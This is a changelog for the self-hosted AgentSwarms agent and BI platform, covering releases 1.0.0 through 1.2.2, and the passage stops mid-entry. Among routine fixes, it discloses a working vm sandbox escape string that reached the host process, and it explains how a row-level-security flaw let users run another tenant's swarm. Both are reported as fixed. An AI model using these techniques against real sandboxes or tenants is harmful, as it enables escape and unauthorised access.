# Changelog

Notable changes to AgentSwarms. Newest first.

This file exists partly for you and partly for the person evaluating whether
this project is maintained — an absent changelog reads as abandonment risk
regardless of how active the commit log is.

Dates are the date work landed. From 1.0.0 the project cuts numbered
releases as git tags (see the GitHub Releases page); `main` remains the
development branch and may be ahead of the latest tag.

---

## 1.2.2 — 2026-08-29

**A new default look, and a self-hosted install that actually starts.** Thirty-five
commits. The visible half is AgentSwarms Native — dark navigation chrome around a
light working pane — which is now the default theme. The half that matters more is
a cluster of Docker self-hosting failures that all reported themselves as
"Unauthorized" while the real error was a connection refused to a Supabase the
container could not reach. No migrations in this release.

### AgentSwarms Native

- **A new theme, and the default.** Dark navigation chrome around a light working
  pane — the pattern the Oracle and AWS consoles use. Navigation reads as a
  persistent frame while content sits on light surfaces, which is where dense
  tables, charts and long documents are easiest to read. Dark and light are
  untouched and still selectable.
- **One continuous chrome.** The first pass left a white seam where the sidebar
  met the top bar: a full-height right border drawn on a transparent element, so
  the translucent border colour composited against the page rather than against
  the chrome it was supposed to divide.

### Self-hosting

- **Every server-side Supabase call failed under Docker**, and said
  "Unauthorized" while doing it. Resolving the caller is the first thing those
  handlers do, so a `connect ECONNREFUSED 127.0.0.1:8000` surfaced as a rejected
  token. The containerized app now gets a Supabase URL it can actually reach.
- **Document generation failed the same way.** PowerPoint, Word and Excel export
  returned "Unauthorized" on a self-hosted install; server routes now resolve
  Supabase from the server URL.
- **`setup-selfhosted.sh` could not complete against a stock stack.** The
  migration step built its connection string without `sslmode`, so the Supabase
  CLI negotiated TLS against a containerized Postgres serving plaintext. A
  first-boot race is fixed alongside it.
- **The js-sandbox health check pointed at a port that is never bound.** The
  sandbox sits only on an internal Docker network, so the check reported "not
  answering yet" for a service that was working, and the host-dev instructions it
  printed could not work at all.
- **`.env` backups are ignored properly.** The existing rules covered `.env`,
  `.env.local` and `.env.*.local` — none of which match `.env.cloud.bak`,
  `.env.production.backup` or `.env.old.copy`. Those hold the same service-role
  and provider keys as `.env` itself and sat one `git add -A` away from being
  committed.

- **One command brings up every service.** Six of the seven services sit behind
  profiles, so a plain `docker compose up` deliberately starts the app alone —
  which left no single command for the whole stack short of naming all three
  profiles by hand. Every profiled service now also carries `all`, so
  `docker compose --profile all up -d --build` starts everything. A test fails
  if a service is ever added without it, because a profile that quietly stops
  meaning "all" breaks nothing and errors nowhere.

### Schema health check

- **An unapplied migration now says so.** A contributor pulls code expecting a
  column a recent migration added, never re-applies migrations, and PostgREST
  rejects the query — which until now surfaced as a broken page or an unhandled
  rejection with no hint that "run your migrations" is the fix.
- **Two layers of detection:** a proactive check on mount and a reactive fetch
  interceptor that catches the failure when it happens, deduped by table and
  column.
- **A modal that hands you the command.** The specific table and column issues
  found, with the migration filename and description where known, and three
  copyable commands — `supabase db push`, `migration up`, and a danger-styled
  `db reset`. Dismissing is session-scoped, because the problem has not gone away
  just because the modal did.
- **Mounted for every route, authenticated or not.** An unapplied migration can
  break the public landing page's queries as easily as a dashboard's.
- **Its limits are written down.** RLS-locked tables can false-negative and the
  curated check list is deliberately not exhaustive — see
  `docs/SCHEMA_HEALTH_CHECK.md`, which also records the two gotchas found testing
  it against a live project.

### Model selection

- **Pick a model from a list, not a text box.** Choosing a model meant typing an
  exact id into a free-text field, with a row of suggestions capped at 24 so a
  large catalogue would not become a wall of badges — which left an OpenRouter
  user with 24 chips and a text box in front of roughly 400 models.
- **Swarm nodes search the provider's real catalogue.** A node offered
  `MODEL_SUGGESTIONS`, a bundled hand-maintained list of about a dozen ids per
  provider, when the app already fetches the full list for the agent editor.
- **The same picker in the agent editor and prompt compare**, after an audit of
  every model picker in the app — most were already fine, since the BI selector
  has had search for a while and is shared by fourteen call sites.
- **"Browse registry" stopped failing with a validation error** — "expected
  object, received undefined", on every open.
- **The dropdown stopped wiping a registry pick.** The toast said "Selected Jamba
  Large 1.7" and the control fell back to "Select a model" one render later.

### Also

- **Read a web page without a third-party key.** `web_browse` was hidden from the
  model unless a Firecrawl key existed, and adding a URL to a knowledge base
  returned `FIRECRAWL_NOT_CONNECTED` — while `web_search`, its sibling, degraded
  to a free provider rather than disappearing. Both surfaces now have the same
  floor.
- **An instance-wide OpenRouter key counts as a connected provider in BI.** On an
  instance whose only provider was `OPENROUTER_API_KEY` in `.env`, the analyst's
  "New analyst" dialog said "Connect a model provider in Integrations" while agent
  chat and swarms called OpenRouter through that same key without complaint.
- **A resizable sidebar.** A drag handle on the right edge clamped to 200-400px,
  `Cmd/Ctrl+\` alongside the existing `Cmd/Ctrl+B`, and both the collapsed state
  and chosen width persisted to localStorage rather than to a cookie nothing read
  back. Dragging below 100px auto-hides it, VS Code style, and a Show/Hide toggle
  in the profile menu works without finding the header trigger.
- **Collapse hides the sidebar completely**, rather than leaving a 48px icon rail
  behind.
- **The Create Agent form survives an accidental dismissal.** Clicking outside the
  dialog unmounts the form entirely and threw away everything typed into it. Every
  field it manages — guardrails, tool toggles, MCP allow-lists, knowledge-base
  links, memory config, not just name and prompt — now round-trips through a
  sessionStorage draft.
- **Popovers stay inside the dialogs that were clipping them.** The Prompt Library
  popover in the Agent Builder lost the first characters of every title and its
  "Use this prompt" button could not be reached at all.

### Upgrading

No migrations and no new environment variables. To bring up the optional
services too, use `docker compose --profile all up -d --build`. The one thing to
know is that
**AgentSwarms Native is now the default theme**, so an installation where nobody
picked a theme explicitly will look different after this upgrade. Dark and light
are unchanged and still selectable.

---

## 1.2.1 — 2026-08-20

**What the app says when it does not know.** Eighty-two commits and 234 files,
and the largest share of them fix one bug in thirty-one different places: a read
that failed was being rendered as a fact. Zero MCP tools. No secrets in the
account. A healthy monitoring probe set. Grades awarded to comparisons that never
ran. None of those pages showed an error, which is exactly why the class
survived — a page that renders `0` looks like it worked. Alongside that, all
twenty-seven documentation pages were audited against the running product and
given search, and ten features landed. Three migrations — run
`npx supabase db push` after upgrading.

### Failed reads stop reporting as facts

- **An adversarial pass over thirty-one modules.** Every headline figure was
  recomputed independently from the database and compared against what the page
  claimed. That is the only way this class surfaces: the page renders cleanly,
  logs nothing, and the number is plausible.
- **A discarded read error is not an empty account.** Secrets, the skill library,
  notebooks, the prompt library, MCP servers and the model registry each answered
  a failed load by rendering the empty state — "you have none" — rather than "we
  could not tell". Each now distinguishes the two and offers a retry.
- **Nor is it a zero, a grade, or a clean bill of health.** The MCP page published
  `0` tools; the monitoring page reported healthy over a probe set it had failed
  to load; two lab pages awarded verdicts to work that never happened; the budgets
  page painted a failed read as "unprotected", which on a spend page reads as an
  instruction to act; and the audit log manufactured evidence of absence, which is
  the worst possible page to do it on.
- **The model registry argued for an action it did not need.** The sharpest form
  of the class — a failed count did not merely misreport, it talked an admin into
  running a sync.
- **Capped views say they are capped.** The analytics page reported a thousand
  traces as though they were the population, the trace log presented its page as
  the whole, and the analyst's 50-row cap could be hit silently. Aggregates still
  run in the database and the cap only trims what is displayed — now with
  disclosure.
- **One 403 stopped claiming "no providers connected" for a whole session**, in a
  shared module, so the fix lands on two pages.
- **The pages that held.** Written up at the same length as the ones that failed:
  /monitoring's refresh path, the trace log's failed-read handling, Web Embedding,
  and the AI Analyst under direct attack. A log that records only faults says
  nothing about where the ground is solid.

### Fixed

- **Every response from a conformant MCP server was unreadable**, reported as a
  server that "did not start in time". It had started; chasing why that message
  was wrong found three further defects.
- **An API key scoped to everything now says so.** Scope rendered as "· N tools"
  or as nothing at all, so the most powerful key on the page was the one with
  nothing written on it.
- **A swarm's deployed badge tracks whether traffic can actually arrive**, rather
  than whether a deploy was once clicked.
- **Importing an agent into a swarm stopped dropping the settings that restrict
  it.**
- **A retrieval that found nothing is a fact the model is now told**, instead of
  being passed over in silence.
- **"Crawled a minute ago" stopped being stamped on data loaded weeks earlier.**
- **A semantic model decertifies on every definition change**, not most of them.
- **The dashboard card headed "last 24h" describes the last 24 hours.**
- **The BI toolbar could not reach its last action** — twelve buttons, 1175px, in
  a nested non-wrapping flex item on a row that did wrap, which is why it survived
  inspection.
- **Provider-reported cost replaces the vendored price table** wherever the
  provider supplies it. Reported as "kimi k3 shows 0 cost", which it did on all
  116 runs: the model postdated the catalog, so the resolver was correctly
  answering that it had no price.
- **Four lint errors that were failing CI**, plus the reason nobody saw them —
  eslint was walking a gitignored agent worktree that CI never checked out.

### New

- **Slack, inbound.** The AI Analyst answers in the channel where the question was
  asked, with request signature verification — plus a settings tab, so a workspace
  can be configured without inserting a row by hand.
- **Import a dbt project.** Reads `target/manifest.json` and says plainly what
  could not come across, so months of existing model and column documentation do
  not have to be retyped into a form.
- **A pull request that breaks a metric definition now fails.** Git export already
  wrote every semantic model as JSON; nothing read those files back, so a broken
  governed metric surfaced later as a refusal at query time, in front of whoever
  asked the question rather than whoever made the change.
- **Generate a whole dashboard from a governed semantic model**, not only from
  source tables.
- **Export a dashboard as a branded PowerPoint deck** whose numbers are the
  dashboard's, with a per-visual checklist, a model picker and a free-text
  instruction field for tone and audience.
- **Synced data is filed under the source it came from**, and can be operated from
  there.
- **`@agentswarms/react`** — a React SDK alternative to iframe embeds, for host
  apps that want their own message rendering, their own theme, or programmatic
  control over the stream, citations and Visual-BI widgets.
- **One command from nothing to a running stack.** The self-hosted Supabase path
  was fully documented and fully manual — JWT secret, two signed keys, the
  storage-boot caveat, the extension preflight, five values wired into `.env` by
  hand. It is now scripted.
- **Chats can be renamed in place**, and a per-chat Tools menu turns on web search
  for one conversation without changing the agent.
- **Skills load on demand once they outgrow the prompt.** Below
  `SKILLS_INLINE_MAX_CHARS` (default 8000) nothing changes and bodies go inline as
  before; above it the prompt carries an index of names and summaries and the
  agent pulls the body it needs through a `use_skill` tool. Swarms are
  unaffected — the headless executor sends no skill ids.

### Documentation

- **Twenty-seven in-app pages audited against the running product**, and drift was
  the whole story: tab orders rearranged since they were written, sidebar groups
  renamed and left stale on eight pages, retrieval numbers that conflated two
  separate caps, an IAM console with seven tabs documented as six, four of eleven
  tools implicitly denied by a list that read as complete, and two shipped
  features — Image Playground and the MCP AI tab — with no page at all.
- **Twenty-eight tuning variables documented.** `.env.example` declares 98
  environment variables and 32 appeared on no page, which is the wrong way round
  for a self-hosted product. The key-rotation advice was corrected at the same
  time.
- **Scenario guides where there had only been field references.** Five swarm
  shapes and how each one fails, five RAG configurations by content type, one
  semantic model built end to end, sync versus async on the API page with the
  numbers that settle it, and the path from a spend spike to its cause.
- **Search across 27 pages and 378 headings**, and an on-this-page rail that lists
  subsections — 143 of them, 42% of every heading written, each already a working
  link and simply unreachable from the rail.
- **The on-this-page links now work after a client-side navigation.** Routes are
  lazily split, so the rail's one-shot scan ran before the new page had been
  committed, read the previous page's headings, and filled with links to ids that
  did not exist. It affected 26 of 27 pages.
- **Documentation stopped scrolling sideways on a phone**, gained a skip link so a
  keyboard reader is not tabbed past roughly thirty-three sidebar entries to reach
  the first word, prints without the app chrome, and respects reduced motion.
- **Two checkers keep it honest.** `npm run check:docs` over 28 pages and
  `npm run check:md-docs` over 18 files verify links, nav paths, environment
  variables and counts against the source — because every defect in this campaign
  came from drift rather than from careless writing, and prose review catches none
  of it.

### Security

- **Three injection paths closed in the agent and swarm code exporters.** The
  exporters turn a saved graph into a Python or TypeScript file the user is told
  to run, and a swarm can arrive from anyone as a dropped `.swarm.json` that is
  one click from the export menu — which makes every interpolated value
  untrusted. Numeric fields are coerced rather than pasted, labels are sanitised
  before they reach docstrings, and tool configs are redacted instead of being
  serialised with credentials intact.

### Known limits

- The 1.2.0 limits stand unchanged: a billion-row local import is not supported,
  an embedded analyst takes 30-95 seconds, and signed viewers are dashboard-only
  by design rather than by omission.
- The adversarial pass covered the thirty-one mapped modules. Streaming, tool
  calls and guardrails in Agent Chat were exercised only in part — a budget cap
  blocked live model turns during that module, and they are recorded as uncovered
  rather than left looking as though they passed.

---

## 1.2.0 — 2026-08-15

**A number you can defend.** The semantic layer stopped being a place to write
definitions and became a compiler that refuses to produce a wrong one. On top of
it sits a dedicated AI Analyst that shows every step it took — the SQL, the
result, its own check on that result — and a verification badge that expires
when the query underneath it changes. Dashboards and the analyst itself can now
be embedded per customer, each viewer seeing only their own rows. Fifteen
migrations — run `npx supabase db push` after upgrading.

### Semantic layer

- **A compiler that refuses to be wrong.** Declare a measure's grain, a table's
  primary key and a join's cardinality, and a query that would fan out is
  **refused at compile time**, naming the join and suggesting the fix. Every
  other tool answers that question with a number that is wrong because the join
  multiplied the rows.
- **Chasm traps resolved.** A multi-fact plan computes each fact at its own
  grain and joins the results, rather than joining the facts and hoping. INNER
  fanning joins keep their filtering scope through an EXISTS rewrite instead of
  double-counting.
- **Aggregate awareness.** Declare a rollup table and the compiler routes to it
  only when it can _prove_ the answer is identical — then discloses which table
  answered.
- **Row and column security that follows the viewer.** A grant carries a row
  filter and a field mask, enforced _before_ compilation so the filter becomes a
  governed IN-clause inside the SQL itself — identical on DuckDB and every
  warehouse. Filter values may be `{{user.attribute}}` tokens resolved per
  caller. An unresolvable token **refuses** the query rather than compiling an
  empty filter, because silent zero rows read as "there is no data".
- **Certification, versions and dependents.** Draft → certified → deprecated,
  with certification blocked until validation passes clean; trigger-written
  version snapshots with a structured diff and restore; and a view of every
  dashboard, agent, swarm node and grant that would break.
- **Fiscal calendars, custom 4-4-5 calendars, parameters, hierarchies and
  currency**, plus period-over-period comparison across a multi-fact plan.

### AI Analyst

- **A dedicated analyst that shows its work.** Each question runs a transparent
  loop — plan, write SQL, execute, self-check, synthesise — and every stage is
  stored and shown. The trace _is_ the product: you can re-run any step's SQL
  and get the same number.
- **Governed steps.** When the planner can express a step against a semantic
  model it emits a `SemanticQuery` and the compiler writes the SQL, so the
  metric is authoritative rather than advisory. Steps say plainly which were
  governed and which were raw SQL.
- **It asks instead of guessing**, offering the assumption it would otherwise
  have made as a single click.
- **Change and trend are computed, not narrated.** Driver contribution, trend
  slopes and median/MAD outliers are arithmetic. Too little history means _no
  forecast at all_ rather than a confident line through noise.
- **Verification that expires.** A human verdict is pinned to a fingerprint of
  the SQL it reviewed; change the query and the badge voids itself.
- **What-if scenarios** on governed steps, kept beside the measured result and
  never folded into the findings.
- **Editable, re-runnable steps** — edit a step's SQL and the findings mark
  themselves stale rather than quietly disagreeing with the numbers above them.
- **Lineage, sharing, scheduling and export.** See which tables an answer's
  numbers came from; share an analyst with IAM groups (each recipient's
  questions run as _them_); re-run a pinned analysis on a cadence with a digest
  that says plainly when nothing changed; export to PDF or an Excel workbook.
- **Parallel steps and per-turn result caching**, bounded at three concurrent
  queries, with identical SQL inside one turn issued once.

### Embedded analytics

- **Signed viewers.** An embed key is a capability token in the host page's
  HTML, so every visitor sees the same rows. Now the host's backend can mint a
  short-lived HMAC token naming the viewer's attributes, which become row
  filters. Every failure — missing, malformed, expired, forged, missing a
  required attribute — is a 403 **stating the reason**, never a fallback to the
  unfiltered view.
- **Widgets that cannot be scoped are withheld, with the reason.** A widget that
  aggregated the scope column away already contains every customer and no filter
  can recover one customer's share; it says which column is missing rather than
  rendering blank, which would read as "no data".
- **Embed the AI Analyst itself.** The full reasoning loop runs server-side as
  the analyst's owner, bounded by the analyst's configured data scope. The
  generated SQL is stripped server-side — it names your tables — while the
  governed model's name survives as the reader's evidence.
- **It streams.** A turn takes 30–95s; the named stage and the stated approach
  land at about six seconds and the trace fills in from there.

### Data & catalog

- **Object storage as a queryable source.** Parquet described from its footer
  rather than skipped, ORC support, an honest account of Avro, and a
  Parquet/CSV bucket queryable straight from the Workbench.
- **Capacity you can spend.** Per-dataset storage mode (auto / import / direct),
  a workspace mirror budget, and least-recently-_used_ eviction. Eviction costs
  speed and never correctness.
- **A metrics catalog.** Every governed metric, searchable by synonym, with what
  its certification actually covers, where it is used, and how fresh its data
  is. Usage never says "unused" — it says what was searched.
- **Scan.** Trends, outliers and concentration across a dashboard's snapshots,
  computed with no model call. A scan that finds nothing reports how many
  widgets it examined, how many it could not, and the thresholds it applied.

### Security & governance

- **Credential key rotation** with envelope/key-id support and a re-encrypt-all
  flow, a full `SECURITY.md`, and a design for external KMS.
- **The local SQL engine could read the server's filesystem.** Closed.
- **Blocked PII was still written to the trace in full.** Closed.
- Warehouse queries that are _refused_ are now audited, not only ones that
  succeed; `{{secret:NAME}}` resolves on A2A auth headers; and a refused fetch
  says why it was actually refused.
- Four tables belonging to a different product were dropped from the schema, and
  three owner columns that never referenced `auth.users` now cascade correctly.

### Fixes

- Dashboard charts silently drew 50 of 364 rows.
- Spend totals read only the first 1000 trace rows.
- Local dataset row counts were read once and never again.
- Headless runs were not billed — their traces are now written with the service
  role.
- The BI narrator added up averages.
- The swarm runtime's edge labels were being deleted.
- Suggested questions were always built from the local datasets, whatever the
  analyst was scoped to.
- Pages announced "nothing here" before anything had loaded.
- People were greeted by their email prefix rather than the name they set.
- The embedded Ask-AI answered from row-less stubs, because the ask path never
  hydrated the widget snapshots.
- Dialogs had no height bound and no overflow, so a tall form grew off both
  edges at once with no way to reach the submit button; and a popover inside a
  dialog could not be scrolled with a mouse, because the dialog's scroll lock
  cancelled wheel events outside its own subtree.
- A product promising a certificate it cannot issue, and a roadmap with stale
  figures, both corrected.

---

## 1.1.0 — 2026-08-08

**Swarms grow up.** A deployed swarm now serves a version you chose rather than
whatever is on the canvas, custom code runs in deployed runs and not just the
browser, and there is a way to measure whether a change made a swarm better.
Knowledge bases gain the three retrieval features that separated this from
Dify. Nine migrations — run `npx supabase db push` after upgrading.

### Swarms

- **Draft vs published.** Editing a swarm used to change what its API keys
  served the moment you pressed Save — mid-experiment, at 3am, to production
  callers. Version history made that recoverable, not preventable. The canvas
  now edits a **draft**; API keys, schedules, sub-swarm calls and embeds all
  execute a **pinned snapshot**. All four loaders resolve it through one shared
  function, because one of them quietly reading `nodes` instead would
  reintroduce the whole bug for that path only. Creating a swarm's first key,
  schedule or embed key publishes the current graph through a **database
  trigger** rather than app code — a future write path would otherwise skip it
  silently. Swarms deployed before this fall back to the live draft and the UI
  says so, so upgrading changes nothing on the day it is applied. **Unpin**
  restores the old behaviour for anyone who wants it.
- **Batch evaluations.** Run a dataset of cases through a swarm and score every
  output. The judge's own pass/fail is **ignored** and the verdict recomputed
  from weighted per-metric scores, because a model that grades and then decides
  will contradict itself; a missing metric is a rejection rather than a zero,
  since silently scoring an unanswered question as 0 is indistinguishable from
  a bad answer. `UNIQUE(eval_run_id, case_id)` makes a retried run idempotent.
- **Custom components.** Author a snippet once with a declared parameter schema
  and it appears in every swarm's palette. Bindings are **snapshots, not live
  links**: a node carries the code and schema it was built with, so editing the
  library cannot silently change a swarm that already works, an exported swarm
  carries everything it needs, and deleting a component leaves working swarms
  working. Parameters arrive **typed** — a number param is a number, not `"5"`.
- **File inputs.** A start-form field of type `file` accepts a PDF, DOCX or text
  document, extracts its text in the browser using the same parsers the
  Knowledge Base uses, and seeds it into flow state. Truncation is always
  reported rather than silently applied.
- **Custom code in deployed runs**, via a hardened sandbox container
  (`--profile sandbox`). Function and component nodes previously worked on the
  canvas only, because the app process holds the service-role key and every
  provider credential. They now execute in a separate container: a fresh V8
  realm per call, a worker thread terminated afterwards (which kills a
  synchronous infinite loop, as a Promise race cannot), an internal-only
  network, `read_only`, `cap_drop ALL`, and a refusal to start without
  `INTERNAL_RUN_SECRET`. **A probe caught a critical escape before any of it
  shipped**: the first version passed a host `console` into the vm, and every
  host function carries the host `Function` constructor on its prototype chain,
  so `console.log.constructor("return process")()` returned the real `process`.
  Nothing from the host realm enters the context now — the console and ctx are
  built _inside_ the sandbox realm and only JSON strings cross.

### Knowledge bases

- **Parent-child chunking.** Retrieval and generation want opposite chunk
  sizes: small chunks match precisely, large chunks let the model answer. Small
  children are embedded and the matched child expands to its **parent** before
  the text reaches the model. Children are cut from their parent and never
  across it, so a citation always contains the words that retrieved it. Parents
  do not overlap, or two neighbouring matches would send the model the same
  sentences twice.
- **Q&A indexing.** A question and a statement are different kinds of text, and
  that difference is a real part of the distance between their vectors. Q&A mode
  generates pairs and embeds the **question**, so the comparison is
  question-to-question. Generation failures are reported per document and never
  downgraded to flat chunks — a collection that disagreed with its own settings
  would be undebuggable.
- **Hybrid retrieval with a weighting slider.** Keyword search existed, but only
  ever looked at documents with **no** embeddings, so an exact term inside an
  embedded document could not rescue a weak semantic match. Postgres full-text
  search now runs over the same chunks and the two are fused by a per-collection
  weight. Scores are normalised within each list first: cosine (~0.3–0.9) and
  `ts_rank` (~0.0–0.3) are not comparable numbers, and adding them raw would
  make the slider do nothing across most of its range.
- **Embeddings default to OpenRouter in the UI**, as they already did on the
  server. The dialog only offered a provider the _user_ had connected, and an
  operator key is not a personal integration — so an instance with
  `OPENROUTER_API_KEY` set displayed OpenAI while the server embedded through
  OpenRouter. Three call sites answered "is this provider usable" and each
  answered differently; they now share one rule.
- **Fixed: two advertised OpenRouter embedding models did not exist.** Both
  `nvidia/*` entries returned `404 No endpoints found`, so selecting one
  produced a failed embed with nothing to indicate the model was never
  available. Replaced with five models probed against the live endpoint, each
  confirmed to return 1536 dimensions. Their prices were **measured** from
  OpenRouter's own billed `usage.cost` rather than guessed, because a
  selectable model with no price makes budgets stop accumulating silently.
- Existing collections default to semantic-only, so upgrading changes no
  answers until someone opts in. Changing chunk mode does not rewrite existing
  chunks; a **Re-index** action does it explicitly, since re-chunking means
  paying to embed the document again.

### Security & governance

- **Fixed: a cross-tenant hole let any user run another tenant's swarm.** The
  RLS policies on `swarm_api_keys` and `swarm_schedules` checked only that a row
  belonged to you — never that the swarm it named did. Any authenticated user
  could insert an API key row pointing at someone else's `swarm_id`, with a key
  hash they chose, then call `POST /api/swarm/run` and receive that swarm's
  output. The server function that mints keys checked ownership, but the anon
  key is public by design and a direct PostgREST insert bypassed it entirely.
  Verified against a live instance before fixing. Both halves of each policy now
  require swarm ownership, and any row already created through the hole is
  removed on migration.

### Observability

- **Observability → Monitoring.** Every optional piece of a deployment is a
  Compose profile an operator may or may not have started, which made "is this
  deployment complete?" a question with no answer in the product. One row per
  service with status, response time and the address that answered, plus live
  CPU, memory and disk. An optional service that was never started reads **"Not
  running" in grey with the command that would start it** — not a red "Down",
  because a status page that cries wolf is one people stop opening. Memory
  reports the **container's cgroup limit** when there is one, not the host's
  RAM: showing 3 GB of 64 GB while the container is killed at 4 GB is worse than
  showing nothing. Superadmin-only in both the page and each server function.
- **Fixed: the monitoring page reported a running service as DOWN.** The egress
  proxy publishes no host port, so an app running outside Compose cannot probe
  it. Services now carry `hostPublished`, derived from compose and pinned by a
  test, and an unreachable service reports **"Can't check from here"** with the
  reason instead of inventing a failure.

### Business intelligence

- **Two end-to-end samples** — Supply Chain Pulse and People Analytics — each
  shipping a dataset, knowledge base, prep flow, semantic model, dashboard and
  ontology, so the BI story can be evaluated without building one first.
- **Fixed: 65 widget queries in six legacy sample dashboards** still used
  AlaSQL-era bracket syntax and returned nothing under DuckDB. Each repaired
  query was validated against the real engine.
- The BI snapshot row cap is **one configurable knob** rather than two
  constants that could disagree.
- Data prep source sections collapse (closed by default, with search), the
  semantic layer leads with fields instead of making you scroll for them, and
  the catalog keeps **Query data** visible.

### Install & deployment

- **`--all` starts every service.** Measured before changing anything:
  `docker compose up` brought up **one** container; with the three profiles,
  six. The guidance had drifted further — the README listed `--docgen` but never
  `--notebooks` or `--sandbox`, and neither setup script had a way to say "give
  me everything". Both scripts now end by pointing at Observability →
  Monitoring, which is the thing that can actually confirm the result.
- **Self-hosted Supabase guide**, verified by running the full migration set
  against a bare `supabase/postgres` container rather than assuming. That found
  a real ordering trap: three migrations write to `storage.buckets`, and the
  `public` column they use is created by the storage service's own migrations —
  so the stack must be started and allowed to settle _before_ the schema is
  pushed.
- **Fixed: four `VITE_` settings could not reach the Docker build**, including
  the BI snapshot cap added in the same release.
- **DEPLOYMENT.md fact-checked line by line.** A dead cross-reference to a
  section that does not exist, a stale "146 migrations / 98 tables" claim (now
  dated rather than silently bumped, which would assert a bare-container test
  that has not been re-run), and a local-install section that still recommended
  a command starting the app alone. The in-app self-hosting page was missing the
  `sandbox` profile entirely.

---

## 1.0.0 — 2026-08-06

**First numbered release.** Everything below shipped on `main` since the last
changelog cut and is included in `v1.0.0`, alongside the platform itself:
agents and multi-agent swarms with a visual canvas, RAG knowledge bases with
cloud-source sync, an AI-native BI suite over 22 warehouse connectors and 5
SaaS app sources, IAM with groups/grants/model rules, budgets, hash-chained
audit, and full execution traces — self-hosted on one Supabase project and
one container, under the Elastic License 2.0.

### Data sources

- **Connections can be shared through IAM** — databases/warehouses and app
  sources are now grantable resource types, so an analyst uses a connection
  without a second copy of the credential existing. A shared connection **runs
  as its owner**: the credential is decrypted server-side and the query goes to
  the owner's warehouse, so a grantee gains the _use_ of it without ever
  receiving it. Unlike other shared resources these rows carry the encrypted
  secret, so there is deliberately **no row-level policy** granting access —
  the grant is resolved server-side and the row loaded with the service role.
  A shared app source **syncs as its owner, into the owner's datasets**, so a
  grantee re-running a stale sync refreshes the real data rather than building
  a parallel copy under their own account.
- **Connection pooling** for PostgreSQL- and MySQL-family sources. Opening a
  connection was **92% of a `SELECT 1`** against a local Postgres (24.9 ms of
  27.1 ms), and that is the best case — a loopback socket with no TLS. End to
  end the driver went from **30.7 ms to 2.9 ms per query**, with identical
  results; `scripts/bench-pool.ts` reproduces both numbers and asserts the
  equality. Pools are keyed by a hash of every credential, so two tenants never
  share a session and a rotated password never reuses the old one.
- **Corporate proxy support and retries** on every outbound connector call.
  `HTTPS_PROXY`/`NO_PROXY` are honoured — many enterprises have no direct
  egress at all, and without this the product simply cannot reach Snowflake or
  Stripe from inside such a network. Transient failures retry with exponential
  backoff and full jitter. `500` is deliberately **not** retried by default: it
  usually means the query ran and then failed, so a retry pays for the same
  scan twice.
- **Scheduled health checks and credential age** for data connections, using
  the product's own probes rather than bespoke ones. A warehouse password
  expiring on your rotation policy now surfaces as a badge and one
  notification, instead of a dashboard erroring in front of a customer.
  Advisory throughout — nothing is auto-disabled and nothing expires.
- **SaaS connectors.** Google Sheets, Stripe, Shopify, HubSpot and Salesforce
  sync into datasets on a shared ingest path — the same type inference,
  staging and snapshot-then-swap a CSV upload uses, so a synced dataset
  behaves identically to an uploaded one. Sync runs manually or on an hourly,
  daily or weekly schedule.
- **12 more databases and warehouses**, taking the total to 22: Microsoft SQL
  Server / Azure SQL, ClickHouse, CockroachDB, TimescaleDB, AlloyDB,
  Greenplum, YugabyteDB, MariaDB, SingleStore, StarRocks, Apache Doris and
  PlanetScale. Wire-compatible providers share one proven driver per protocol
  rather than getting near-duplicate implementations.
- **Fixed: 17 of 22 warehouse providers could not be saved.** The `provider`
  CHECK constraint had never been widened past the original five, so
  PostgreSQL, MySQL, Trino, Athena and Oracle — all long shipped — failed on
  insert with a constraint violation that named neither the provider nor the
  reason. A test now parses the constraint from the migrations and fails CI if
  it drifts from the TypeScript union again.

### Semantic layer

- **Fixed: validation was broken for every local semantic model.** The
  compiler's dialect defaults to `alasql` and the warehouse branch overrode it;
  the local branch never did. Once the local engine became DuckDB, validation
  compiled AlaSQL-quoted SQL and ran it on DuckDB, so **every field failed** —
  `SELECT 'Order ID' AS 'order_id' FROM saas_sales LIMIT 1`, where AlaSQL's
  quoting makes a string literal out of a column name and a syntax error out of
  the alias. 23 of 23 fields failed on the bundled sample model. The query path
  had resolved this correctly all along; only validation was left behind.
- **Fixed: validation reloaded every dataset once per field.** It probes one
  query per dimension and per metric, sequentially, and each went through a
  helper that reloads every dataset the caller can see — every row — on each
  call. A 19-field model meant nineteen full reloads, and the Validate button
  never returned. The datasets now load once for the whole probe loop; the
  read-only guard still runs per statement, because the tables are reusable and
  the guard is not.

- **Fixed: `ORDER BY` silently dropped a field it did not recognise.** The
  compiler rejects every unknown name — metric, dimension, filter field, grain,
  comparison, source table — with one exception, which filtered unknown
  `orderBy` fields out instead. So "top 10 customers by revenue" with a
  mistyped or since-renamed order field returned **an arbitrary ten rows, still
  labelled top 10**: no error, and a number on a dashboard that is wrong in a
  way nobody can see. It now refuses and names the columns the query does
  return, so an AI caller can correct itself. This is a **behaviour change** —
  a saved query carrying a stale order field now errors where it used to
  quietly return unordered rows.
- **Fixed: a malformed limit reached the database as `LIMIT NaN`.** The clamp
  was `Math.max(1, Math.min(q.limit ?? DEFAULT, MAX))`, and both of those pass
  NaN straight through, so a limit that did not parse produced invalid SQL and
  a syntax error from the warehouse rather than a clear rejection. A fractional
  limit produced `LIMIT 2.7`, which Postgres rejects outright. Limits are now
  floored, range-clamped and refused when not finite; a numeric string still
  works, because an AI-authored query may legitimately send `"50"`.
- Injection was probed directly and held: filter values are quote-escaped
  per dialect, `contains` escapes LIKE metacharacters with a dialect-neutral
  `~`, IN-lists are escaped element-wise, and an unsafe source table is
  rejected. `tests/unit/semanticRefusal.test.ts` pins all of it.

- **Relative date filters**: `last_n_days`, `this_month`, `last_month`,
  `this_quarter`, `last_quarter`, `ytd`. Half-open UTC windows resolved at
  query time, so a dashboard does not need editing as time passes.
- **Period-over-period**: `yoy`, `mom`, `prior_period`, adding `_prev`,
  `_change` and `_pct_change` per metric. Implemented as a date-shifted
  self-join rather than `LAG`, so a gap in the series cannot line a period up
  against the wrong predecessor.

### Query engine

- **Fixed: Run Query was unclickable on a 1366x768 laptop.** The SQL editor's
  toolbar is a `justify-between` flex row, and a flex item defaults to
  `min-width: auto` — so the right-hand group (source select 192px + Format 94px
  - Run Query 115px = 413px) kept its full width inside an editor column that is
    only 310px at a 1238px viewport. With `overflow: visible` it painted past the
    column and **underneath the AI panel**, which sits later in the DOM and so
    painted on top. The workbench's primary action could not be clicked at any
    width below roughly 1340px. The toolbar now wraps, the badge truncates and the
    source select shrinks; verified at 1100, 1238, 1366 and 1700. Typechecks, the
    full unit suite and a production build all passed throughout — only a browser
    was ever going to find this one.

- **One engine everywhere: the browser now runs DuckDB-Wasm.** Local datasets
